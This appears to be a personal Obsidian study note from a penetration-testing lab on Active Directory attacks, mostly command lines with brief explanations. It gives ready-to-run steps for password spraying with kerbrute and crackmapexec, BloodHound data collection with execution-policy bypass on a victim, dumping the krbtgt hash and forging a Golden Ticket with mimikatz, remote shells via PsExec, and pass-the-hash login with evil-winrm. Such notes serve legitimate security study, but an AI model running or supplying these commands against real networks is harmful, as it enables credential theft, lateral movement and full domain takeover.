#show
<%*
const path = tp.file.folder(true).split('/');
const filename = "2_B_AD_" + path[path.length - 1];
await tp.file.rename(filename);
tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 1] + "]]";
-%>

# Password spraying
Check for AD account lockout policy
```powershell
net accounts
```
If not set, we can try to spray AD passwords by two means:
- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin` (see `~/Documents/activeInformationGathering`)
- `kerbrute passwordspray -d corp.com .\users.txt "Password"` (cross-platform but requires UDP. Text file must be ANSI, else network error)
- `crackmapexec smb $hip -u $user -p '$password' -d corp.com --continue-on-success`
# BloodHound
1. **Setup C2 (Kali)**
```bash
(sleep 15 && bloodhound)& export PS1="$PS1\[\e]0;BloodHound\a\]"; sudo -b neo4j console
```
Enter root-pw into console. Use `neo4j:wandton` as login. If this doesn't work, login to `http://localhost:7474` with `neo4j:neo4j` and change password

One must also transfer the SharpHound script or executable to the victim ([[2_fileTransfer]]). They are in `/ftphome/`

2. **Collect data (Victim)**
```powershell
powershell -ep bypass
```

```powershell
.\SharpHound.exe --CollectionMethods All
```
or
```powershell
Import-Module .\Sharphound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory $dir
```
(Both gather all data except for local group policies.)

When done, transfer the .zip to kali ([[2_fileTransfer]])

3. **Analyze data (Kali)**
	1. In the Web-Interface, use the "Upload Data" function to upload the .zip
	2. Enter `MATCH (m:Computer) RETURN m` as raw query on the bottom. Right-click the node and select "Mark as Owned"
	3. Same for `m:User`
	4. Click the "More Info" tab on the top left. Change to tab "Analysis" and run the following analysis:
		1. _Shortest Paths to Domain Admins from Owned Principals_
		2. _Find Workstations where Domain Users can RDP_
		3. _Find Servers where Domain Users can RDP_
		4. _Find Computers where Domain Users are Local Admin_
	5. Check Relation-Ships with `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`
	Tips: Use the Control-Key to show information about all nodes. Look for the "?" Help menu, it also contains abuse possibilities.

# Yet-to-test attacks



##### Golden Ticket with mimikatz
Enter mimikatz
```
privilege::debug
```
Save Domain ID (sid), Primary NTLM
```
lsadump::lsa /inject /name:krbtgt
```
Create Golden Ticket (saved to ticket.kirbi)
```
kerberos::golden /user:Administrator /domain:%dns% /sid:%sid% /krbtgt:%ntlm% /id:500
```
Open a CMD with elevated privileges to all machines
```
misc::cmd
```
Runs cmd.exe on $machine (Needs PsExec.exe - you can scp) 
```powershell
PsExec.exe \\$machine cmd.exe
```

##### Pass-The-Hash Attack
```
evil-winrm -i $hip -u $user -H $hash
```
